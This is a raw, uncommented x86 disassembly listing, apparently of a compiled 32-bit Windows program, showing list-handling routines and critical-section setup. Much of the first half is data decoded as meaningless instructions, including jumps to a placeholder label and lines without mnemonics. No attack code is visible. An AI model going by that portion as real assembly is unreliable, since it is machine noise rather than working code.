add [ eax - 0x6f ] cl
inc ecx
add [ edx + edx * 4 ] bl
inc ecx
add [ eax - 0x76 ] ah
inc ecx
add [ eax - 0x6e ] bl
inc ecx
add ah cl
xchg edx eax
inc ecx
add al dh
mov [ ecx ] es
cld
mov [ ecx ] es
jo r-xdata
inc ecx
add [ eax + edx * 4 + 0x41 ] dh
add ah al
mov es [ ecx ]
test [ edx - 0x6d6bffbf ] dl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc ecx
add [ esi + eax * 4 - 0x791fffbf ] cl
inc ecx
add [ edi + eax * 4 - 0x76dbffbf ] cl
inc ecx
add [ ecx + ecx * 4 + 0x41 ] bh
add [ eax ] dl
mov al [ ecx ]
pushad
lea eax [ ecx ]
jl r-xdata
inc esp
mov es [ ecx ]
rol [ edx - 0x702bffbf ] 0x41
add [ ebp + eax * 4 + 0x41 ] dl
add [ eax ] ch
xchg [ ecx ] al
adc [ eax - 0x6fdfffbf ] dl
add [ edi + ecx * 4 ] bh
inc ecx
add [ eax - 0x71 ] dh
inc ecx
add [ eax ] bl
push edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] al
add ah dh
push esp
inc ecx
add [ eax ] dh
xor eax 0x353c0040
imul ebp [ esi + 0x67 ] 0x55e09073
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ eax - 0x27ffbe73 ] bl
lea eax [ ecx ]
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + edx * 4 ] bl
imul ebp [ esi + 0x67 ] 0x7473694c
sbb [ edi + 0x41 ] dl
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x736bffc0 ] bl
inc ecx
add al bh
xor [ 0x353c0040 ] dh
outsb
jae r-xdata
jb r-xdata
jae r-xdata
push ebx
je r-xdata
popad
inc ecx
add [ eax - 0x6d ] ch
inc ecx
add [ eax + 0x24004193 ] al
sub eax [ eax ]
and al 0x2b
inc eax
add [ eax ] ah
xchg esp eax
inc ecx
add [ esp + edx * 4 + 0x54070041 ] ah
push ebx
je r-xdata
sbb al 0x93
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fcom [ ebp + 0x41 ]
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
inc ecx
add [ ebx + edx * 2 + 0x41 ] cl
pop es
inc ebx
insb
popad
jae r-xdata
add [ edi + edx * 4 ] dh
inc ecx
add [ 0x6e614854 ] cl
insb
insd
clc
push edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] dl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edi + edx * 2 ] bh
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x69 ] ah
inc ecx
add [ edi + edx * 4 + 0x41 ] dh
add [ edi + edx * 4 ] dl
inc ecx
add [ edi + edx * 4 ] ah
inc ecx
add [ eax ] ah
xchg esp eax
inc ecx
popad
add [ ebp + 0x57880040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 + 0x40041 ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
push ebx
je r-xdata
popad
insd
mov eax eax
jo r-xdata
jpo r-xdata
mov [ ecx ] es
clc
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
in al 0x58
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
inc ecx
add [ eax ] dl
add [ eax ] al
add [ edi + edx * 2 ] bh
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x6d ] ch
inc ecx
add [ eax + 0x70004193 ] al
cdq
inc ecx
add [ ebx + ebp ] ah
inc eax
add [ eax - 0x5bffbe67 ] ch
xchg esp eax
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add [ edi + edx * 4 ] ah
inc ecx
add [ eax ] ah
xchg esp eax
inc ecx
add [ edi + edx * 4 ] dh
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 + 0x80041 ] cl
add [ eax ] al
lodsb [ esi ]
push edi
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x66cbffc0 ] bl
inc ecx
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x69 ] ah
inc ecx
add [ edi + edx * 4 + 0x41 ] dh
add [ edi + edx * 4 ] dl
add [ ebx + 0x415604c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jns r-xdata
push ebx
je r-xdata
movsb [ edi ] [ esi ]
je r-xdata
xor [ eax + 0x7f280041 ] al
inc ecx
outsb
dec ecx
je r-xdata
sbb al 0x93
je r-xdata
insd
xchg esp eax
inc ecx
add [ edx + ebx * 4 + 0x540d0041 ] bl
dec ebp
popad
insd
pushad
pop ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004159 ] al
add [ eax ] al
add [ eax + 0x30004158 ] bl
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x6633ffc0 ] bl
inc ecx
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x66 ] dh
inc ecx
add [ eax + 0x70004193 ] al
cdq
inc ecx
add [ eax ] ch
fwait
inc ecx
add [ eax - 0x5bffbe67 ] ch
push ebx
push ebx
outsd
jb r-xdata
inc ecx
add [ esp + edx * 4 - 0x6563ffbf ] ah
inc ecx
add [ 0x6d654d54 ] cl
add [ ecx ] 0x28
jg r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax ] al
add [ eax ] al
add [ ebp + 0x56700040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ eax - 0x6d ] ch
inc ecx
add [ eax + 0x70004193 ] al
cdq
inc ecx
add [ ebx * 4 - 0x6657ffbf ] dh
inc ecx
add [ esp + edx * 4 + 0x540f0041 ] ah
push edx
jae r-xdata
popad
insd
mov eax eax
fcomp [ ecx + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
pop ecx
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x30004158 ] bl
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x6303ffc0 ] bl
inc ecx
add [ ebx + edx * 4 ] bl
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_415ee7
push ecx
push eax
[ esp + edx * 8 - 0x2b5bffbf ]
inc ecx
add [ eax - 0x3fffbe2c ] ch
aam 0x41
add ah dh
aam 0x41
add ah al
aam 0x41
add ah cl
aam 0x41
add al dl
aam 0x41
add ah bl
aam 0x41
add [ eax - 0x63ffbe2b ] cl
aad 0x41
add [ eax - 0x37ffbe29 ] bh
aam 0x41
add [ esp + edx * 8 - 0x2b67ffbf ] ch
inc ecx
add al ah
xlat
inc ecx
add [ edx ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x41 ] ah
outsb
outsb
je r-xdata
add [ edx + ebx * 8 + 0x41 ] al
add al bh
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
cmp al 0x5f
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
[ edi + 0x5e ]
pop ebx
retn
arpl [ ecx + 0x63 ] ax
je sub_41612c
aam 0x41
add al dh
aad 0x41
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
mov al [ 0x40041d9 ]
fild [ ecx ]
test al 0xda
inc ecx
add [ edx + ebx * 8 ] bh
inc ecx
add [ edx + ebx * 8 + 0x41 ] ch
add [ eax - 0x26 ] al
inc ecx
add [ edx + ebx * 8 + 0x10041 ] cl
out dx eax
clc
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x6800408d
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffbea0 ] dh
pushad
inc ecx
add [ eax + eax ] dl
add [ esi + ebx * 2 ] bh
inc ecx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x261bffc0 ] bl
inc ecx
add al bh
jpo r-xdata
add [ eax + eax ] dl
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
pushad
inc ecx
outsb
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
int3
push [ eax - 0x26 ]
inc ecx
add [ esp + edx * 2 ] cl
inc edx
popad
jae r-xdata
mov edx ds
inc ecx
add [ ecx ] al
add bh ch
add [ eax ] dl
aam 0x41
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
pop esi
inc ecx
add [ ebx + edx * 2 + 0x20041 ] cl
pop es
inc ebx
insb
popad
jae r-xdata
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x270bffc0 ] bl
inc ecx
add al dh
fadd [ ecx ]
sub cl bl
inc ecx
add [ eax + 0x5c0041d9 ] cl
fld [ ecx ]
mov ecx ds
inc ecx
add [ eax + ebx * 8 - 0x26bfffbf ] ch
inc ecx
add [ ecx + ebx * 8 + 0x54100041 ] dl
inc edx
popad
jae r-xdata
add [ esi + 0x35400040 ] bh
jae r-xdata
pop ebp
inc ecx
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
push esp
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
call sub_41a100
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5d ] cl
sub_416114
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40613c
pop edi
pop esi
pop ebx
retn
sub_41613c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406120
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416164
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40615c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41625c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_417570
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403514
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403514
test al al
je r-xdata
sub_4162bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41625c
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41625c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403514
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41632c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4032b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_417414
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4163a8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
mov eax [ esi + 0x4 ]
call sub_4032e8
mov eax [ esi + 0x8 ]
call sub_4032e8
mov eax [ esi + 0xc ]
call sub_4032e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4163e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_417570
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_40324c
test al al
jne r-xdata
sub_416448
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_417570
mov edx eax
mov eax ebp
call sub_403514
test al al
jne r-xdata
sub_41648c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416527
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403238
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4163e8
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_417414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41652e
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
sub_41654c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_4052e0
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_41656c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_417570
mov edx edi
call sub_41654c
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_417570
mov edx edi
call sub_41654c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_417460
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_41654c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_417460
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_416610
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_417570
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_416448
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_41665c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41632c
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417414
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4166d0
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_417570
call sub_4032e8
inc edi
dec ebp
jne r-xdata
sub_41672c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_417570
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4162bc
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_416770
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4163e8
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_417570
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4167b4
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_416837
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403238
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41683e
lea eax [ ebp - 0x10c ]
call sub_404038
retn
sub_416844
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41672c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_416250
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4167b4
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_417570
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417570
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403514
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41672c
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417460
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_417414
sub_416930
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417570
mov edx ebp
call sub_416534
test al al
jne r-xdata
sub_416974
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41632c
mov edx eax
mov eax [ edi + 0x4 ]
call sub_417414
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417570
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4175cc
test eax eax
jge r-xdata
sub_4169d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417570
mov esi eax
mov edx ebp
mov eax esi
call sub_41656c
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4032e8
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417460
sub_416a20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4032b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_41690c
xor eax eax
push ebp
push sub_416b1f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b26
mov eax [ rw-data ]
call sub_4169c4
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
